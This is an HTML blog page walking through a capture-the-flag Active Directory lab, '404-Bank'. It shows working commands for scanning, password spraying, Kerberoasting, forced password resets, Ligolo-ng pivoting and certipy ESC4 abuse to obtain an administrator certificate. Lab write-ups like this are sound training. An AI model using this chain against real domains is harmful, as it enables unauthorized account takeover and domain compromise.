@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>404-Bank | Zerotrace Logs</title>
+  <meta name="description" content="Complete walkthrough of 404-Bank CTF machine from HackSmarter Labs. Active Directory exploitation covering ACL abuse, Kerberoasting, password cracking, ADCS ESC4 exploitation, and pivoting techniques for domain compromise." />
+
+  <!-- Essential Open Graph tags for LinkedIn -->
+  <meta property="og:title" content="404-Bank | Zerotrace Logs" />
+  <meta property="og:description" content="Active Directory CTF walkthrough covering ACL abuse, Kerberoasting, ADCS ESC4, custom wordlist generation, and internal pivoting with Ligolo-ng." />
+  <meta property="og:image" content="https://z3rotrace.live/assets/404bank/image.png" />
+  <meta property="og:url" content="https://z3rotrace.live/HackSmarter/404bank.html" />
+  <meta property="og:type" content="article" />
+
+  <!-- Twitter Card tags -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="404-Bank | Zerotrace Logs" />
+  <meta name="twitter:description" content="Active Directory CTF walkthrough covering ACL abuse, Kerberoasting, ADCS ESC4, custom wordlist generation, and internal pivoting with Ligolo-ng." />
+  <meta name="twitter:image" content="https://z3rotrace.live/assets/404bank/image.png" />
+
+  <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
+  <link rel="apple-touch-icon" href="../assets/favicon.png" />
+  <link rel="stylesheet" href="../style.css?v=5"/>
+  <style>
+    /* Machine info box styling */
+    .machine-info {
+      background: rgba(0, 170, 255, 0.05);
+      border: 1px solid rgba(0, 170, 255, 0.25);
+      border-left: 4px solid #c77dff;
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .machine-info ul {
+      margin: 0;
+      padding-left: 0;
+    }
+
+    .machine-info li {
+      margin-bottom: 0.25rem;
+    }
+
+    .machine-info li::before {
+      color: #00aaff;
+    }
+
+    /* Attack chain visualization */
+    .attack-chain {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-left: 3px solid #c77dff;
+      border-radius: 6px;
+      padding: 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .attack-chain pre {
+      margin: 0;
+      background: transparent;
+      border: none;
+      padding: 0;
+      color: #d0eaff;
+      line-height: 1.8;
+    }
+
+    /* Tools list styling */
+    .tools-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 0.75rem;
+      margin: 1rem 0;
+    }
+
+    .tools-grid li {
+      background: rgba(0, 170, 255, 0.03);
+      border-radius: 4px;
+      padding: 0.5rem 0.75rem 0.5rem 1.5rem;
+    }
+
+    /* Difficulty color coding */
+    .difficulty-easy { color: #3fb950; font-weight: 600; }
+    .difficulty-medium { color: #d29922; font-weight: 600; }
+    .difficulty-hard { color: #f85149; font-weight: 600; }
+
+    /* Question/Answer boxes */
+    .question {
+      background: rgba(199, 125, 255, 0.1);
+      border-left: 3px solid #c77dff;
+      padding: 1rem;
+      margin: 1rem 0 0.5rem 0;
+      border-radius: 4px;
+    }
+
+    .answer {
+      background: rgba(0, 170, 255, 0.05);
+      border-left: 3px solid #00aaff;
+      padding: 1rem;
+      margin: 0 0 1rem 0;
+      border-radius: 4px;
+    }
+
+    /* Responsive images */
+    section img {
+      max-width: 100%;
+      height: auto;
+      border: 1px solid rgba(0, 170, 255, 0.25);
+      border-radius: 6px;
+      margin: 1rem 0;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+<header>
+  <h1 class="terminal-title" aria-label="Zerotrace Logs">
+    <span class="prompt" aria-hidden="true">$</span>
+    <span class="typed" id="term-typing" aria-hidden="true"></span>
+    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
+    <span class="sr-only">Zerotrace Logs</span>
+  </h1>
+</header>
+
+<!-- Side hamburger control -->
+<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
+  <span class="sr-only">Toggle navigation</span>
+  <span class="hamburger-icon" aria-hidden="true"></span>
+</button>
+
+<!-- Sidebar navigation -->
+<aside class="sidebar" id="sidebar" aria-label="Main navigation">
+  <div class="sidebar-header">
+    <h3>Navigate</h3>
+    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">x</span></button>
+  </div>
+  <div class="sidebar-content">
+    <ul class="sidebar-nav">
+      <li><a href="../index.html">Home</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Writeups</button>
+        <ul class="submenu" hidden>
+          <li><a href="../writeups/ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
+          <li><a href="../writeups/sliver-c2-getting-started.html">Getting Started with Sliver C2</a></li>
+        </ul>
+      </li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>HackSmarter Labs</button>
+        <ul class="submenu">
+          <li><a href="welcome.html">Welcome</a></li>
+          <li><a href="staged.html">Staged</a></li>
+          <li><a href="buildingmagic.html">BuildingMagic</a></li>
+          <li><a href="arasaka.html">Arasaka</a></li>
+          <li><a href="midgarden2-badsuccessor.html">Midgarden2</a></li>
+          <li><a href="banksmarter.html">BankSmarter</a></li>
+          <li><a href="ascension.html">Ascension</a></li>
+          <li><a href="slayer.html">Slayer</a></li>
+          <li><a href="anomaly.html">Anomaly</a></li>
+          <li><a href="sharethepain.html">ShareThePain</a></li>
+          <li><a href="sysco.html">Sysco</a></li>
+          <li><a href="lumon.html">Lumon</a></li>
+          <li><a href="stellarcomms.html">StellarComms</a></li>
+          <li><a href="404bank.html" aria-current="page">404-Bank</a></li>
+        </ul>
+      </li>
+      <li><a href="../vector3.html">Certification Journey</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Projects</button>
+        <ul class="submenu" hidden>
+          <li><a href="../projects/dual-cloud-c2-redirector.html">Dual Cloud Redirector C2</a></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+</aside>
+<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
+
+<section>
+  <h2>404-Bank</h2>
+
+  <div class="machine-info">
+    <ul>
+      <li><strong>Platform:</strong> <a href="https://www.hacksmarter.org/" target="_blank" rel="noopener">HackSmarter Labs</a></li>
+      <li><strong>Difficulty:</strong> <span class="difficulty-hard">Medium-Hard</span></li>
+      <li><strong>Target:</strong> 10.0.17.242</li>
+      <li><strong>Domain:</strong> 404finance.local</li>
+      <li><strong>Key Topics:</strong> Active Directory ACL Abuse, Kerberoasting, ADCS ESC4, Pivoting</li>
+    </ul>
+  </div>
+
+  <h3>Introduction</h3>
+  <p>404 Bank, a staple of the local financial community, is conducting its annual security assessment. To uphold their motto of being <strong>"Proven, Local, Strong,"</strong> the bank has commissioned the <strong><a href="https://www.hacksmarter.org/" target="_blank" rel="noopener">HackSmarter Labs</a> Red Team</strong> to perform an internal penetration test.</p>
+
+  <p><strong>Key Skills Required:</strong></p>
+  <ul>
+    <li>Active Directory enumeration and exploitation</li>
+    <li>ACL abuse techniques</li>
+    <li>Password cracking</li>
+    <li>ADCS exploitation (ESC4)</li>
+    <li>Pivoting and tunneling</li>
+    <li>Kerberos attacks (AS-REP roasting, Kerberoasting)</li>
+  </ul>
+
+  <h2>Objective / Scope</h2>
+
+  <h3>Initial Access</h3>
+  <p>You have been provided with VPN access to their internal environment, but no other information. The goal is to compromise the domain and obtain administrator access.</p>
+
+  <h2>Reconnaissance</h2>
+
+  <h3><span class="step">[Step 1]</span> Nmap Scan</h3>
+  <p>I initiated a comprehensive port scan against the target to identify available services:</p>
+  <pre><code>nmap --privileged -p- -T4 -sC -sV -Pn -oA nmap_404 10.0.17.242</code></pre>
+
+  <p><strong>Key Findings:</strong></p>
+  <pre><code>Nmap 7.95 scan initiated Fri Feb  6 12:50:29 2026 as: /usr/lib/nmap/nmap --privileged -p- -T4 -sC -sV -Pn -oA nmap_404 10.0.17.242
+Nmap scan report for 10.0.17.242
+Host is up (0.13s latency).
+Not shown: 65511 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: 404 Finance Group
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-06 18:01:01Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: 404finance.local, Site: Default-First-Site-Name)
+|_ssl-date: 2026-02-06T18:02:30+00:00; +3s from scanner time.
+| ssl-cert: Subject: commonName=DC-404.404finance.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC-404.404finance.local
+| Not valid before: 2025-07-03T13:35:22
+|_Not valid after:  2026-07-03T13:35:22
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: 404finance.local, Site: Default-First-Site-Name)
+|_ssl-date: 2026-02-06T18:02:30+00:00; +4s from scanner time.
+| ssl-cert: Subject: commonName=DC-404.404finance.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC-404.404finance.local
+| Not valid before: 2025-07-03T13:35:22
+|_Not valid after:  2026-07-03T13:35:22
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: 404finance.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC-404.404finance.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC-404.404finance.local
+| Not valid before: 2025-07-03T13:35:22
+|_Not valid after:  2026-07-03T13:35:22
+|_ssl-date: 2026-02-06T18:02:30+00:00; +3s from scanner time.
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: 404finance.local, Site: Default-First-Site-Name)
+|_ssl-date: 2026-02-06T18:02:30+00:00; +4s from scanner time.
+| ssl-cert: Subject: commonName=DC-404.404finance.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC-404.404finance.local
+| Not valid before: 2025-07-03T13:35:22
+|_Not valid after:  2026-07-03T13:35:22
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: FINANCE404
+|   NetBIOS_Domain_Name: FINANCE404
+|   NetBIOS_Computer_Name: DC-404
+|   DNS_Domain_Name: 404finance.local
+|   DNS_Computer_Name: DC-404.404finance.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-02-06T18:01:52+00:00
+|_ssl-date: 2026-02-06T18:02:30+00:00; +4s from scanner time.
+| ssl-cert: Subject: commonName=DC-404.404finance.local
+| Not valid before: 2026-01-27T22:25:59
+|_Not valid after:  2026-07-29T22:25:59
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  msrpc         Microsoft Windows RPC
+49678/tcp open  msrpc         Microsoft Windows RPC
+49702/tcp open  msrpc         Microsoft Windows RPC
+49713/tcp open  msrpc         Microsoft Windows RPC
+49743/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC-404; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre>
+
+  <p><strong>Environment Summary:</strong></p>
+  <ul>
+    <li><strong>Domain:</strong> 404finance.local</li>
+    <li><strong>Domain Controller:</strong> DC-404.404finance.local</li>
+    <li><strong>OS:</strong> Windows Server 2019 (Build 17763)</li>
+    <li><strong>Key Services:</strong> Active Directory, IIS Web Server, RDP, WinRM, ADCS (implied)</li>
+  </ul>
+
+  <h3><span class="step">[Step 2]</span> Web Enumeration</h3>
+  <p>The HTTP service on port 80 revealed a corporate website for 404 Finance Group. The front page contains valuable information about employees.</p>
+  <p><img src="../assets/404bank/image.png" alt="404 Finance Group Homepage"></p>
+
+  <p>The website revealed several employee names that could be used for username enumeration. Additionally, a downloadable <code>.exe</code> file was discovered on another page.</p>
+  <p><img src="../assets/404bank/image-1.png" alt="Executable Download Page"></p>
+
+  <h4>Creating a Username List</h4>
+  <p>Using the employee names discovered on the website, I generated a comprehensive username list with <a href="https://github.com/urbanadventurer/username-anarchy" target="_blank" rel="noopener">username-anarchy</a>:</p>
+  <pre><code>username-anarchy/username-anarchy --input-file usernames --select-format first,flast,first.last,firstl > users.list</code></pre>
+  <p>This tool generates various username format permutations (first name only, first initial + last name, first.last, etc.) which are commonly used in enterprise environments.</p>
+
+  <h4>Executable Analysis</h4>
+  <p>Running <code>strings</code> against the downloaded executable revealed an interesting Base64-encoded debug string:</p>
+  <p><img src="../assets/404bank/image-2.png" alt="Debug String in Executable"></p>
+
+  <p>Decoding the Base64 string revealed what appeared to be an MD5 hash. I confirmed this by counting the characters:</p>
+  <pre><code>┌──(kali㉿kali)-[~/hacksmarter_labs/404_Bank]
+└─$ echo 'ZGQyZWYzNDUzMGRlN2U1YmVmMjJhMDVlN2U1ZGQxNzg=' | base64 -d
+dd2ef34530de7e5bef22a05e7e5dd178
+┌──(kali㉿kali)-[~/hacksmarter_labs/404_Bank]
+└─$ echo 'ZGQyZWYzNDUzMGRlN2U1YmVmMjJhMDVlN2U1ZGQxNzg=' | base64 -d | wc -c
+32</code></pre>
+  <p>The 32-character length confirmed this was an MD5 hash.</p>
+
+  <h4>Hash Cracking</h4>
+  <p>Using hashcat with the rockyou wordlist, I successfully cracked the MD5 hash:</p>
+  <p><img src="../assets/404bank/image-3.png" alt="Hashcat MD5 Crack"></p>
+
+  <h2>Initial Access</h2>
+
+  <h3><span class="step">[Step 3]</span> Username Validation</h3>
+  <p>First, I generated the <code>/etc/hosts</code> file entry using NetExec:</p>
+  <pre><code>┌──(kali㉿kali)-[~/hacksmarter_labs/404_Bank]
+└─$ nxc smb 10.0.17.242 -u karl.hackermann -p '[REDACTED]' --generate-hosts-file host
+SMB         10.0.17.242     445    DC-404           [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-404) (domain:404finance.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.17.242     445    DC-404           [+] 404finance.local\karl.hackermann:[REDACTED]</code></pre>
+
+  <p>Using Kerbrute, I validated which usernames from my generated list were legitimate domain accounts:</p>
+  <p><img src="../assets/404bank/image-4.png" alt="Kerbrute Username Validation"></p>
+
+  <h3><span class="step">[Step 4]</span> Password Spraying</h3>
+  <p>With the validated usernames, I performed password spraying using the cracked password <code>Password123!!</code> and achieved success:</p>
+  <p><img src="../assets/404bank/image-5.png" alt="Password Spray Success"></p>
+
+  <p><strong>Valid Credentials:</strong></p>
+  <pre><code>karl.hackermann:Redacted</code></pre>
+
+  <h3><span class="step">[Step 5]</span> Active Directory Enumeration</h3>
+  <p>Using NetExec, I collected comprehensive BloodHound data for attack path analysis:</p>
+  <p><img src="../assets/404bank/image-6.png" alt="NetExec BloodHound Collection"></p>
+
+  <p>I'm using a custom NetExec branch that includes <code>certihound</code> (a library i made recently), a tool that collects ADCS (Active Directory Certificate Services) data and includes it in the BloodHound collection. This project can be found at: <a href="https://github.com/0x0Trace/NetExec/tree/feature/adcs-collection" target="_blank" rel="noopener">https://github.com/0x0Trace/NetExec/tree/feature/adcs-collection</a></p>
+  <p><img src="../assets/404bank/image-7.png" alt="ADCS Data Collection"></p>
+
+  <p>The BloodHound analysis immediately identified <code>svc.services</code> as a high-value target due to its privileges within the domain.</p>
+  <p><img src="../assets/404bank/image-8.png" alt="svc.services High Value Target"></p>
+
+  <p>However, we observed that the <code>svc.services</code> account was disabled, which would require additional steps to exploit.</p>
+
+  <h2>Privilege Escalation - Multi-Stage ACL Abuse</h2>
+
+  <h3><span class="step">[Step 6]</span> Attack Path Discovery</h3>
+  <p>Analyzing the BloodHound data revealed a clear attack path from our compromised account to the high-value <code>svc.services</code> account:</p>
+  <p><img src="../assets/404bank/image-9.png" alt="Attack Path to svc.services"></p>
+
+  <p><strong>Attack Chain:</strong></p>
+  <ol>
+    <li><code>karl.hackermann</code> has <strong>GenericWrite</strong> over <code>tom.reboot</code></li>
+    <li><code>tom.reboot</code> has <strong>ForceChangePassword</strong> over <code>robert.graef</code></li>
+    <li><code>robert.graef</code> has <strong>WriteAccountRestrictions</strong> over <code>svc.services</code></li>
+  </ol>
+
+  <p>The <code>WriteAccountRestrictions</code> ACE is particularly powerful as it allows us to:</p>
+  <ul>
+    <li>Remove the ACCOUNTDISABLE flag</li>
+    <li>Disable Kerberos pre-authentication (enabling AS-REP roasting)</li>
+    <li>Modify other account restrictions</li>
+  </ul>
+
+  <h3><span class="step">[Step 7]</span> Compromising tom.reboot via Targeted Kerberoasting</h3>
+  <p>The <strong>GenericWrite</strong> permission allows us to modify properties of the target user, including adding a Service Principal Name (SPN). By adding an SPN to <code>tom.reboot</code>, we can perform a targeted Kerberoasting attack.</p>
+
+  <p>I used <a href="https://github.com/ShutdownRepo/targetedKerberoast" target="_blank" rel="noopener">targetedKerberoast</a> to add an SPN and request a service ticket:</p>
+  <p><img src="../assets/404bank/image-10.png" alt="Targeted Kerberoast Attack"></p>
+
+  <p>The retrieved Kerberos ticket hash was successfully cracked using hashcat:</p>
+  <pre><code>hashcat krb5_hash_tom /usr/share/wordlists/rockyou.txt</code></pre>
+  <p><img src="../assets/404bank/image-11.png" alt="Hashcat Kerberos Hash Crack"></p>
+
+  <p><strong>Compromised Credentials:</strong></p>
+  <pre><code>tom.reboot:Redacted</code></pre>
+
+  <h3><span class="step">[Step 8]</span> Compromising robert.graef via ForceChangePassword</h3>
+  <p>With control over <code>tom.reboot</code>, I leveraged the <strong>ForceChangePassword</strong> ACE to reset <code>robert.graef</code>'s password using bloodyAD:</p>
+  <pre><code>bloodyAD --host DC-404.404finance.local -d 404finance.local -u 'tom.reboot'  -p '[REDACTED]' set password 'robert.graef'  'Zerotrace123!'</code></pre>
+  <p><img src="../assets/404bank/image-12.png" alt="Force Password Change on robert.graef"></p>
+
+  <h3><span class="step">[Step 9]</span> Targeting svc.services via WriteAccountRestrictions</h3>
+  <p>With access to <code>robert.graef</code>, I now had <strong>WriteAccountRestrictions</strong> over <code>svc.services</code>. This powerful permission allowed me to modify the account's UserAccountControl flags.</p>
+
+  <p>First, I removed the <code>ACCOUNTDISABLE</code> flag to enable the account:</p>
+  <pre><code>bloodyAD --host DC-404.404finance.local -d 404finance.local -u robert.graef -p 'Zerotrace123!' remove uac ACCOUNTDISABLE -t svc.services</code></pre>
+  <p><img src="../assets/404bank/image-13.png" alt="Remove ACCOUNTDISABLE Flag"></p>
+
+  <p>Next, I disabled Kerberos pre-authentication by adding the <code>DONT_REQ_PREAUTH</code> flag, making the account vulnerable to AS-REP roasting:</p>
+  <p><img src="../assets/404bank/image-14.png" alt="Disable Pre-Authentication"></p>
+
+  <p>With pre-authentication disabled, I performed an AS-REP roasting attack to retrieve the password hash:</p>
+  <p><img src="../assets/404bank/image-15.png" alt="AS-REP Roast svc.services"></p>
+
+  <p>Unfortunately, the hash could not be cracked using standard wordlists:</p>
+  <p><img src="../assets/404bank/image-16.png" alt="Failed Hash Crack"></p>
+
+  <p>This indicated that the password for <code>svc.services</code> was either very complex or not in common wordlists, requiring an alternate attack path.</p>
+
+  <h2>Lateral Movement - Hunting for Credentials</h2>
+
+  <h3><span class="step">[Step 10]</span> Expanding Access via robert.graef</h3>
+  <p>Going back to analyze <code>robert.graef</code>'s permissions in BloodHound, I discovered additional privilege opportunities:</p>
+  <p><img src="../assets/404bank/image-17.png" alt="robert.graef Additional Privileges"></p>
+
+  <p>Key findings:</p>
+  <ul>
+    <li><strong>AddMember</strong> privilege over <strong>Remote Desktop Users</strong> group</li>
+    <li><strong>ForceChangePassword</strong> over three accounts: <code>melanie.kunz</code>, <code>nina.inkasso</code>, and <code>jan.tresor</code></li>
+  </ul>
+
+  <p><strong>Strategy:</strong> Reset passwords for these accounts, add them to the Remote Desktop Users group, and hunt for credentials, files, and sensitive data via RDP sessions.</p>
+
+  <h3><span class="step">[Step 11]</span> Compromising RDP Accounts</h3>
+  <p>I systematically compromised each account:</p>
+  <pre><code>┌──(kali㉿kali)-[~/hacksmarter_labs/404_Bank]
+└─$ bloodyAD --host DC-404.404finance.local -d 404finance.local -u 'robert.graef'  -p 'Zerotrace123!' set password 'melanie.kunz'  'Zerotrace123!'
+[+] Password changed successfully!
+
+┌──(kali㉿kali)-[~/hacksmarter_labs/404_Bank]
+└─$ bloodyAD --host DC-404.404finance.local -d 404finance.local -u 'robert.graef' -p 'Zerotrace123!' add groupMember 'remote desktop users' 'melanie.kunz'
+[+] melanie.kunz added to remote desktop users</code></pre>
+
+  <p>I repeated this process for <code>nina.inkasso</code> and <code>jan.tresor</code>.</p>
+
+  <h3><span class="step">[Step 12]</span> Credential Discovery</h3>
+  <p>While enumerating the desktop of user <code>jan.tresor</code> via RDP, I discovered a valuable file in the Recycle Bin:</p>
+  <p><img src="../assets/404bank/image-18.png" alt="File in jan.tresor's Recycle Bin"></p>
+
+  <p>Restoring the message titled "Access credentials - Dont tell Anyone..." revealed a password:</p>
+  <p><img src="../assets/404bank/image-19.png" alt="Recovered Credential Message"></p>
+
+  <p>The message context indicated this was the password for <strong>Daniel Hoffman</strong>:</p>
+  <pre><code>daniel.hoffmann:RemoteAccess!2024</code></pre>
+
+  <h3><span class="step">[Step 13]</span> Validating daniel.hoffmann Access</h3>
+  <p>Checking BloodHound, I confirmed that <code>daniel.hoffmann</code> is a member of the <strong>Remote Management Users</strong> group, granting WinRM access:</p>
+  <p><img src="../assets/404bank/image-20.png" alt="daniel.hoffmann Group Membership"></p>
+
+  <p>I validated the credentials using NetExec:</p>
+  <p><img src="../assets/404bank/image-21.png" alt="Credential Validation"></p>
+
+  <p>Establishing an Evil-WinRM session, I successfully obtained the user flag:</p>
+  <p><img src="../assets/404bank/image-22.png" alt="User Flag Capture"></p>
+
+  <h2>Post-Exploitation - Internal Service Discovery</h2>
+
+  <h3><span class="step">[Step 14]</span> Port Enumeration</h3>
+  <p>Running <code>netstat</code> on the compromised system revealed an internal service listening on port 5000 that wasn't detected during the external Nmap scan:</p>
+  <p><img src="../assets/404bank/image-23.png" alt="Internal Port 5000 Discovery"></p>
+
+  <p>This aligned with a hint found on the public website indicating that the web administrator prefers using port 5000 for internal services but we cant use it from outside the machine , that indicates that need localhost address.</p>
+
+  <h3><span class="step">[Step 15]</span> Setting Up a Pivot with Ligolo-ng</h3>
+  <p>To access the internal service, I configured a tunnel using <a href="https://docs.ligolo.ng/Localhost/" target="_blank" rel="noopener">Ligolo-ng</a>. Ligolo-ng uses the hardcoded "magic" CIDR <code>240.0.0.0/4</code> for accessing localhost services on the agent.</p>
+
+  <p><strong>Proxy Setup:</strong></p>
+  <pre><code>┌──(kali㉿kali)-[~/hacksmarter_labs/404_Bank]
+└─$ sudo ./proxy -selfcert
+[sudo] password for kali:
+INFO[0000] Loading configuration file ligolo-ng.yaml
+WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
+INFO[0000] Listening on 0.0.0.0:11601
+    __    _             __
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
+        /____/                          /____/
+
+  Made in France ♥            by @Nicocha30!
+  Version: 0.8.2
+
+ligolo-ng » INFO[0116] Agent joined.                                 id=0e934fa4d28f name="FINANCE404\\daniel.hoffmann@DC-404" remote="10.0.17.242:49872"
+ligolo-ng »
+ligolo-ng » session
+? Specify a session : 1 - FINANCE404\daniel.hoffmann@DC-404 - 10.0.17.242:49872 - 0e934fa4d28f
+[Agent : FINANCE404\daniel.hoffmann@DC-404] » interface_create --name 404-bank
+INFO[0221] Creating a new 404-bank interface...
+INFO[0221] Interface created!
+[Agent : FINANCE404\daniel.hoffmann@DC-404] » interface_add_route --name 404-bank --route 240.0.0.1/32
+INFO[0235] Route created.
+[Agent : FINANCE404\daniel.hoffmann@DC-404] » start --tun 404-bank
+INFO[0253] Starting tunnel to FINANCE404\daniel.hoffmann@DC-404 (0e934fa4d28f)</code></pre>
+
+  <p>With the tunnel established, I could now access the internal service at <code>http://240.0.0.1:5000</code>.</p>
+  <p><img src="../assets/404bank/image-24.png" alt="Ligolo-ng Tunnel Active"></p>
+
+  <h3><span class="step">[Step 16]</span> Accessing the Internal Admin Interface</h3>
+  <p>Browsing to the internal service revealed an admin login panel:</p>
+  <p><img src="../assets/404bank/image-25.png" alt="Internal Admin Panel"></p>
+
+  <p>Reviewing BloodHound again, I noticed that <code>daniel.hoffmann</code> has <strong>ForceChangePassword</strong> privileges over the <code>webadmin</code> user:</p>
+  <p><img src="../assets/404bank/image-26.png" alt="daniel.hoffmann Privileges"></p>
+
+  <p>I reset the <code>webadmin</code> password using bloodyAD:</p>
+  <p><img src="../assets/404bank/image-27.png" alt="Changing webadmin Password"></p>
+
+  <p>Successfully logging into the internal admin interface, I discovered a downloadable <code>.zip</code> file:</p>
+  <p><img src="../assets/404bank/image-28.png" alt="Admin Interface with ZIP File"></p>
+
+  <h3><span class="step">[Step 17]</span> Password-Protected Archive</h3>
+  <p>The ZIP file was password-protected. Standard wordlists failed to crack it:</p>
+  <p><img src="../assets/404bank/image-29.png" alt="Failed ZIP Crack"></p>
+
+  <p><strong>Solution:</strong> Create a custom wordlist using data from the target environment. I used CeWL to scrape the public website and generate a context-specific wordlist:</p>
+  <pre><code>cewl --depth 3 http://10.0.17.242 --with-numbers --write custom_wordlist</code></pre>
+
+  <p>Using the custom wordlist, I successfully cracked the ZIP password:</p>
+  <p><img src="../assets/404bank/image-30.png" alt="Successful ZIP Crack"></p>
+
+  <p>Extracting the contents revealed the password for <code>svc.services</code>:</p>
+  <p><img src="../assets/404bank/image-31.png" alt="svc.services Password Found"></p>
+
+  <h2>Domain Compromise - ADCS ESC4 Exploitation</h2>
+
+  <p>With access to the <code>svc.services</code> account, I could now exploit the Active Directory Certificate Services (ADCS) vulnerability identified earlier. The environment contained a certificate template vulnerable to <strong>ESC4</strong> (certificate template with overly permissive ACLs).</p>
+
+  <h3>Understanding ESC4</h3>
+  <p>ESC4 occurs when a low-privileged user has write permissions over a certificate template. An attacker can modify the template to make it vulnerable to privilege escalation, then request a certificate impersonating a high-privileged user (like Domain Administrator).</p>
+  <p>Reference: <a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation" target="_blank" rel="noopener">https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation</a></p>
+
+  <h3>Exploitation Steps</h3>
+
+  <p><strong>Step 1:</strong> Modify the vulnerable template to restore default configuration (making it exploitable):</p>
+  <pre><code>┌──(kali㉿kali)-[~/hacksmarter_labs/404_Bank]
+└─$ certipy template -u 'svc.services@404finance.local' -p '[REDACTED]' -dc-ip 10.0.17.242 -template 'Vuln-ESC4' -write-default-configuration -no-save
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Updating certificate template 'Vuln-ESC4'
+[*] Replacing:
+[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
+[*]     flags: 66104
+[*]     pKIDefaultKeySpec: 2
+[*]     pKIKeyUsage: b'\x86\x00'
+[*]     pKIMaxIssuingDepth: -1
+[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
+[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
+[*]     pKIOverlapPeriod: b'\x00\x80\xa6\n\xff\xde\xff\xff'
+[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
+[*]     msPKI-RA-Signature: 0
+[*]     msPKI-Enrollment-Flag: 0
+[*]     msPKI-Private-Key-Flag: 16
+[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
+Are you sure you want to apply these changes to 'Vuln-ESC4'? (y/N): y
+[*] Successfully updated 'Vuln-ESC4'</code></pre>
+
+  <p><strong>Step 2:</strong> Request a certificate with the Administrator's UPN (User Principal Name):</p>
+  <pre><code>┌──(kali㉿kali)-[~/hacksmarter_labs/404_Bank]
+└─$ certipy req -u 'svc.services@404finance.local' -p '[REDACTED]' -ca '404finance-DC-404-CA' -template 'Vuln-ESC4' -upn 'administrator@404finance.local'
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: 404FINANCE.LOCAL.
+[!] Use -debug to print a stacktrace
+[*] Requesting certificate via RPC
+[*] Request ID is 4
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@404finance.local'
